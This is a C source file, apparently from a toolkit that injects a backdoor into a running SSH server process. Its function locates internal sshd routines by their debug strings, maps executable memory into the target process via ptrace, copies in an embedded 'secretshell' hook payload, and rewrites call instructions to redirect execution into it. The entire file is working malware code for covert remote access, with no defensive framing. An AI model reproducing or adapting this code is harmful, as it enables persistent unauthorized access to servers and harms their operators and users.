#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

#include <inject.h>
#include <sig.h>
#include <common.h>
#include <callcache.h>
#include <util.h>
#include <ptrace.h>

extern unsigned char hook_secretshell_bin[];
extern int hook_secretshell_bin_len;

void backdoor_menu_install(inject_ctx *ctx) {
	int i, j;
	callcache_entry *callcache;
	callcache_entry *entry;
	u32 callcache_total;
	u64 diff;

	u8 *evil_bin;

	evil_bin = malloc(hook_secretshell_bin_len);
	memcpy(evil_bin, hook_secretshell_bin, hook_secretshell_bin_len);

	u64 child_set_env = sub_by_debugstr(ctx, "child_set_env: too many env vars");
	info("child_set_env = 0x%llx", child_set_env);

	u64 process_input  = sub_by_debugstr(ctx, "This service allows sftp connections only.");
	info("do_child = 0x%llx", process_input);

	u64 hole_addr = 0; 

	info2("entering critical phase");

	patch_placeholder(evil_bin, hook_secretshell_bin_len, 0xc0cac01ac0debabe, process_input);
	patch_placeholder(evil_bin, hook_secretshell_bin_len, 0x1111111122222222, child_set_env);
	patch_placeholder(evil_bin, hook_secretshell_bin_len, 0xc0debabe13371337, ctx->config_addr);

	callcache = get_callcache();
	callcache_total = get_callcachetotal();

	for(i=0; i<callcache_total; i++) {
		entry = &callcache[i];
		if (entry->dest == process_input && entry->type == CALLCACHE_TYPE_CALL) {
			if (hole_addr == 0) {
				hole_addr = find_hole(ctx, entry->addr, 0x1000);
				info("FIND HOLE %lx", hole_addr);

				_mmap(
					ctx, (void*)hole_addr, 0x1000,
					PROT_READ| PROT_WRITE | PROT_EXEC,
					MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED,
					0, 0
				);

				_poke(ctx->pid, hole_addr, evil_bin, hook_secretshell_bin_len);
				info("COPIED HOOK!");
			}

			diff = 0x100000000-(entry->addr-hole_addr)-5;

			info(
				"building a bridge [0x%lx->0x%lx] .. opcode = [E8 %02X %02X %02X %02X]",
				entry->addr, hole_addr,
				diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
			);

			_poke(ctx->pid, entry->addr+1, &diff, 4);
			
		}
	}
}
